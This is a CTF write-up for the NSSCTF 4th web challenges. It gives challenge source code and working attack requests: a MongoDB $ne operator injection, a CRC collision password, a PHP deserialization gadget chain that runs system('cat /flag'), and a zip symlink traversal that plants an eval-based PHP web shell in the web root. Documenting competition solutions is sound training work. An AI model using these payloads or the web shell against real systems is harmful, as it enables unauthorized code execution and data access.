+++
date = '2025-08-25T17:42:53+08:00'
draft = false
title = 'NSSCTF - 4th Web WriteUP'
categories = ['WriteUP']
tags = ['WriteUP', 'NSSCTF']

+++

## Web

### ez_signin

<!--more-->

```python
from flask import Flask, request, render_template, jsonify
from pymongo import MongoClient
import re

app = Flask(__name__)

client = MongoClient("mongodb://localhost:27017/")
db = client['aggie_bookstore']
books_collection = db['books']

def sanitize(input_str: str) -> str:
    return re.sub(r'[^a-zA-Z0-9\s]', '', input_str)

@app.route('/')
def index():
    return render_template('index.html', books=None)

@app.route('/search', methods=['GET', 'POST'])
def search():
    query = {"$and": []}
    books = []

    if request.method == 'GET':
        title = request.args.get('title', '').strip()
        author = request.args.get('author', '').strip()

        title_clean = sanitize(title)
        author_clean = sanitize(author)

        if title_clean:
            query["$and"].append({"title": {"$eq": title_clean}})  

        if author_clean:
            query["$and"].append({"author": {"$eq": author_clean}}) 

        if query["$and"]:
            books = list(books_collection.find(query))

        return render_template('index.html', books=books)

    elif request.method == 'POST':
        if request.content_type == 'application/json':
            try:
                data = request.get_json(force=True)

                title = data.get("title")
                author = data.get("author")
                
                if isinstance(title, str):
                    title = sanitize(title)
                    query["$and"].append({"title": title})
                elif isinstance(title, dict):
                    query["$and"].append({"title": title})

                if isinstance(author, str):
                    author = sanitize(author)
                    query["$and"].append({"author": author})
                elif isinstance(author, dict):
                    query["$and"].append({"author": author})

                if query["$and"]:
                    books = list(books_collection.find(query))
                    return jsonify([
                        {"title": b.get("title"), "author": b.get("author"), "description": b.get("description")} for b in books
                    ])

                return jsonify({"error": "Empty query"}), 400

            except Exception as e:
                return jsonify({"error": str(e)}), 500

        return jsonify({"error": "Unsupported Content-Type"}), 400
    
if __name__ == "__main__":
    app.run("0.0.0.0", 8000)
```

这里要用 mongodb 特定的语法去搜索即可，然后传 dict 绕过检测，用正则来筛选搜索，下面语句的含义是筛选出除了 `aaa` 的所有字段。

```plaintext
POST /search HTTP/1.1
Host: node10.anna.nssctf.cn:21810
Referer: http://mitm/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/json

{"title":{"$ne": "aaa"},"author":{"$ne": "aaa"}}
```

![](../assets/a4d05369e31eef256658cf6233b8c912.png)

### EzCRC

题目源码如下。

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
highlight_file(__FILE__);


function compute_crc16($data) {
    $checksum = 0xFFFF;
    for ($i = 0; $i < strlen($data); $i++) {
        $checksum ^= ord($data[$i]);
        for ($j = 0; $j < 8; $j++) {
            if ($checksum & 1) {
                $checksum = (($checksum >> 1) ^ 0xA001);
            } else {
                $checksum >>= 1;
            }
        }
    }
    return $checksum;
}

function calculate_crc8($input) {
    static $crc8_table = [
        0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
        0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
        0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
        0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
        0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
        0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
        0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
        0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
        0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
        0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
        0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
        0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
        0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
        0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
        0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
        0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
        0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
        0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
        0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
        0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
        0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
        0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
        0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
        0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
        0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
        0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
        0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
        0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
        0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
        0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
        0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
        0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
    ];

    $bytes = unpack('C*', $input);
    $length = count($bytes);
    $crc = 0;
    for ($k = 1; $k <= $length; $k++) {
        $crc = $crc8_table[($crc ^ $bytes[$k]) & 0xff];
    }
    return $crc & 0xff;
}

$SECRET_PASS = "Enj0yNSSCTF4th!";
include "flag.php";

if (isset($_POST['pass']) && strlen($SECRET_PASS) == strlen($_POST['pass'])) {
    $correct_pass_crc16 = compute_crc16($SECRET_PASS);
    $correct_pass_crc8 = calculate_crc8($SECRET_PASS);

    $user_input = $_POST['pass'];
    $user_pass_crc16 = compute_crc16($user_input);
    $user_pass_crc8 = calculate_crc8($user_input);

    if ($SECRET_PASS === $user_input) {
        die("这样不行");
    }

    if ($correct_pass_crc16 !== $user_pass_crc16) {
        die("这样也不行");
    }

    if ($correct_pass_crc8 !== $user_pass_crc8) {
        die("这样还是不行吧");
    }

    $granted_access = true;

    if ($granted_access) {
        echo "都到这份上了,flag就给你了: $FLAG";
    } else {
        echo "不不不";
    }
} else {
    echo "再试试";
}

?>
```

CRC 碰撞一下就好了。

```plaintext
POST / HTTP/1.1
Host: node10.anna.nssctf.cn:29384
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded

pass=Enj0yNSSCTF4{(%
```

### [mpga]filesystem

题目源码如下。

```php
<?php

class ApplicationContext{
    public $contextName; 

    public function __construct(){
        $this->contextName = 'ApplicationContext';
    }

    public function __destruct(){
        $this->contextName = strtolower($this->contextName);
    }
}

class ContentProcessor{
    private $processedContent; 
    public $callbackFunction;   

    public function __construct(){
    
        $this->processedContent = new FunctionInvoker();
    }

    public function __get($key){
        
        if (property_exists($this, $key)) {
            if (is_object($this->$key) && is_string($this->callbackFunction)) {
                
                $this->$key->{$this->callbackFunction}($_POST['cmd']);
            }
        }
    }
}

class FileManager{
    public $targetFile; 
    public $responseData = 'default_response'; 

    public function __construct($targetFile = null){
        $this->targetFile = $targetFile;
    }

    public function filterPath(){ 
        
        if(preg_match('/^\/|php:|data|zip|\.\.\//i',$this->targetFile)){
            die('文件路径不符合规范');
        }
    }

    public function performWriteOperation($var){ 
        
        $targetObject = $this->targetFile; 
        $value = $targetObject->$var; 
    }

    public function getFileHash(){ 
        $this->filterPath(); 

        if (is_string($this->targetFile)) {
            if (file_exists($this->targetFile)) {
                $md5_hash = md5_file($this->targetFile);
                return "文件MD5哈希: " . htmlspecialchars($md5_hash);
            } else {
                die("文件未找到");
            }
        } else if (is_object($this->targetFile)) {
            try {
                
                $md5_hash = md5_file($this->targetFile);
                return "文件MD5哈希 (尝试): " . htmlspecialchars($md5_hash);
            } catch (TypeError $e) {
                
                
                return "无法计算MD5哈希，因为文件参数无效: " . htmlspecialchars($e->getMessage());
            }
        } else {
            die("文件未找到");
        }
    }

    public function __toString(){
        if (isset($_POST['method']) && method_exists($this, $_POST['method'])) {
            $method = $_POST['method'];
            $var = isset($_POST['var']) ? $_POST['var'] : null;
            $this->$method($var); 
        }
        return $this->responseData;
    }
}

class FunctionInvoker{
    public $functionName; 
    public $functionArguments; 
    public function __call($name, $arg){
        
        if (function_exists($name)) {
            $name($arg[0]); 
        }
    }
}

$action = isset($_GET['action']) ? $_GET['action'] : 'home';
$output = ''; 
$upload_dir = "upload/";

if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

if ($action === 'upload_file') { 
    if(isset($_POST['submit'])){
        if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == UPLOAD_ERR_OK) {
            $allowed_extensions = ['txt', 'png', 'gif', 'jpg'];
            $file_info = pathinfo($_FILES['upload_file']['name']);
            $file_extension = strtolower(isset($file_info['extension']) ? $file_info['extension'] : '');

            if (!in_array($file_extension, $allowed_extensions)) {
                $output = "<p class='text-red-600'>不允许的文件类型。只允许 txt, png, gif, jpg。</p>";
            } else {
                
                $unique_filename = md5(time() . $_FILES['upload_file']['name']) . '.' . $file_extension;
                $upload_path = $upload_dir . $unique_filename;
                $temp_file = $_FILES['upload_file']['tmp_name'];

                if (move_uploaded_file($temp_file, $upload_path)) {
                    $output = "<p class='text-green-600'>文件上传成功！</p>";
                    $output .= "<p class='text-gray-700'>文件路径：<code class='bg-gray-200 p-1 rounded'>" . htmlspecialchars($upload_path) . "</code></p>";
                } else {
                    $output = "<p class='text-red-600'>上传失败！</p>";
                }
            }
        } else {
            $output = "<p class='text-red-600'>请选择一个文件上传。</p>";
        }
    }
}

if ($action === 'home' && isset($_POST['submit_md5'])) {
    $filename_param = isset($_POST['file_to_check']) ? $_POST['file_to_check'] : '';

    if (!empty($filename_param)) {
        $file_object = @unserialize($filename_param);
        if ($file_object === false || !($file_object instanceof FileManager)) {
            $file_object = new FileManager($filename_param);
        }
        $output = $file_object->getFileHash();
    } else {
        $output = "<p class='text-gray-600'>请输入文件路径进行MD5校验。</p>";
    }
}

?>
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>文件管理系统</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen px-4 py-8">
    <div class="bg-white p-6 md:p-8 rounded-lg shadow-md w-full max-w-4xl mx-auto">
        <h1 class="text-3xl font-bold mb-6 text-gray-800 text-center">文件管理系统</h1>

        <div class="flex justify-center mb-6 space-x-4">
            <a href="?action=home" class="py-2 px-4 rounded-lg font-semibold <?php echo $action === 'home' ? 'bg-indigo-600 text-white' : 'bg-indigo-100 text-indigo-800 hover:bg-indigo-200'; ?>">主页</a>
            <a href="?action=upload_file" class="py-2 px-4 rounded-lg font-semibold <?php echo $action === 'upload_file' ? 'bg-blue-600 text-white' : 'bg-blue-100 text-blue-800 hover:bg-blue-200'; ?>">上传文件</a>
        </div>

        <?php if ($action === 'home'): ?>
            <div class="text-center">
                <p class="text-lg text-gray-700 mb-4">欢迎使用文件管理系统。</p>
                <p class="text-sm text-gray-500 mb-6">
                    为了确保文件一致性和完整性，请在下载前校验md5值，完成下载后进行对比。
                </p>

                <h2 class="text-2xl font-bold mb-4 text-gray-800">文件列表</h2>
                <div class="max-h-60 overflow-y-auto border border-gray-200 rounded-lg p-2 bg-gray-50">
                    <?php
                    $files = array_diff(scandir($upload_dir), array('.', '..'));
                    if (empty($files)) {
                        echo "<p class='text-gray-500'>暂无文件。</p>";
                    } else {
                        echo "<ul class='text-left space-y-2'>";
                        foreach ($files as $file) {
                            $file_path = $upload_dir . $file;
                            echo "<li class='flex items-center justify-between p-2 bg-white rounded-md shadow-sm'>";
                            echo "<span class='text-gray-700 break-all mr-2'>" . htmlspecialchars($file) . "</span>";
                            echo "<div class='flex space-x-2'>";
                            echo "<a href='" . htmlspecialchars($file_path) . "' download class='bg-blue-500 hover:bg-blue-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out'>下载</a>";
                            echo "<form action='?action=home' method='POST' class='inline-block'>";
                            echo "<input type='hidden' name='file_to_check' value='" . htmlspecialchars($file_path) . "'>"; 
                            echo "<button type='submit' name='submit_md5' class='bg-purple-500 hover:bg-purple-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out'>校验MD5</button>"; 
                            echo "</form>";
                            echo "</div>";
                            echo "</li>";
                        }
                        echo "</ul>";
                    }
                    ?>
                </div>

                <?php if (!empty($output)): ?>
                    <div class="mt-6 p-4 bg-gray-50 border border-gray-200 rounded-lg">
                        <h3 class="lg font-semibold mb-2 text-gray-800">校验结果:</h3>
                        <?php echo $output; ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php elseif ($action === 'upload_file'): ?>
            <h2 class="text-2xl font-bold mb-4 text-gray-800 text-center">上传文件</h2>
            <form action="?action=upload_file" method="POST" enctype="multipart/form-data" class="space-y-4">
                <label for="upload_file" class="block text-gray-700 text-sm font-bold mb-2">选择文件:</label>
                <input type="file" name="upload_file" id="upload_file" class="block w-full text-sm text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 focus:outline-none">
                <button type="submit" name="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg transition duration-300 ease-in-out">
                    上传
                </button>
            </form>
            <?php if (!empty($output)): ?>
                <div class="mt-6 p-4 bg-gray-50 border border-gray-200 rounded-lg">
                    <h3 class="text-lg font-semibold mb-2 text-gray-800">上传结果:</h3>
                    <?php echo $output; ?>
                </div>
            <?php endif; ?>
            <p class="mt-6 text-center text-sm text-gray-500">
                只允许上传 .txt, .png, .gif, .jpg 文件。
            </p>
        <?php endif; ?>
    </div>
</body>
</html>
```

```php
<?php  
  
class ApplicationContext{  
    public $contextName;  
  
    public function __construct(){  
        $this->contextName = new FileManager();  
    }  
  
    public function __destruct(){  
        $this->contextName = strtolower($this->contextName);  
    }  
}  
  
class ContentProcessor{  
    private $processedContent;  
    public $callbackFunction;  
  
    public function __construct(){  
        $this->processedContent = new FunctionInvoker();  
        $this->callbackFunction = "system";  
    }  
  
    public function __get($key){  
        echo 333;  
//        echo $key;  
  
        if (property_exists($this, $key)) {  
            if (is_object($this->$key) && is_string($this->callbackFunction)) {  
                echo 444;  
  
                $this->$key->{$this->callbackFunction}($_POST['cmd']);  
            }  
        }  
    }  
}  
  
class FileManager{  
    public $targetFile;  
    public $responseData = 'default_response';  
  
    public function __construct(){  
        $this->targetFile = new ContentProcessor();  
    }  
  
    public function performWriteOperation($var){  
        echo 222;  
  
        $targetObject = $this->targetFile;  
        $value = $targetObject->$var;  
    }  
  
    public function __toString(){  
//        if (isset($_POST['method']) && method_exists($this, $_POST['method'])) {  
//            echo 111;  
//            $method = $_POST['method'];  
//            $var = isset($_POST['var']) ? $_POST['var'] : null;  
//            $this->$method($var);  
//        }  
        $method = "performWriteOperation";  
        $var = new FunctionInvoker();  
        $this->$method($var);  
        return $this->responseData;  
    }  
}  
  
class FunctionInvoker{  
    public $functionName;  
    public $functionArguments;  
    public function __call($name, $arg){  
        echo 555;  
  
        if (function_exists($name)) {  
            $name($arg[0]);  
        }  
    }  
}  
  
//$a = new ApplicationContext();  
//echo urlencode(serialize($a));  
  
$filename_param = isset($_POST['file_to_check']) ? $_POST['file_to_check'] : '';  
if (!empty($filename_param)) {  
    $file_object = @unserialize($filename_param);  
//    if ($file_object === false || !($file_object instanceof FileManager)) {  
//        $file_object = new FileManager($filename_param);  
//    }  
//    $output = $file_object->getFileHash();  
} else {  
    $output = "<p class='text-gray-600'>请输入文件路径进行MD5校验。</p>";  
}
```

```plaintext
POST /?action=home HTTP/1.1
Host: node9.anna.nssctf.cn:22665
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

submit_md5=1&file_to_check=O%3A18%3A%22ApplicationContext%22%3A1%3A%7Bs%3A11%3A%22contextName%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A2%3A%7Bs%3A12%3A%22functionName%22%3BN%3Bs%3A17%3A%22functionArguments%22%3BN%3B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D%7D&method=performWriteOperation&var=processedContent&cmd=cat%20/flag
```

### ez_upload

一看就是有源码泄露的漏洞。

![](../assets/7558b4b68556242085dc223dcfd8f856.png)

```plaintext
GET /index.php HTTP/1.1
Host: node9.anna.nssctf.cn:26668


GET /1.txt HTTP/1.1


```

![](../assets/fbb58fae1b13431b2bc6d96d503d97a6.png)

```php
<!DOCTYPE html>
<html>
<head>
  <title>CTF Upload</title>
</head>
<body>
  <h2>Upload your zip file</h2>
  <form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="Upload" />
  </form>
</body>
</html>

<?php
error_reporting(0);

$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};
?>
```

那么，我们只要构造一个特殊的压缩包，里面的文件名是 `../var/www/html/1.php` 的话，等到它解压出来，它就会路径穿越，从而保存到网站根目录中，从而 RCE。

我们可以使用 zip 创建软链接并向软链接中写入文件，首先考虑将 `/var/www/html` 文件夹软链接到 `/tmp/html` 文件夹中，然后再构造一个 zip 文件，将马写进去。

```bash
ln -s /var/www/html/ html

zip --symlinks 1.zip html
```

```bash
echo '<?=eval($_POST[1]);?>' | sudo tee html/1.php

zip 2.zip html/1.php
```
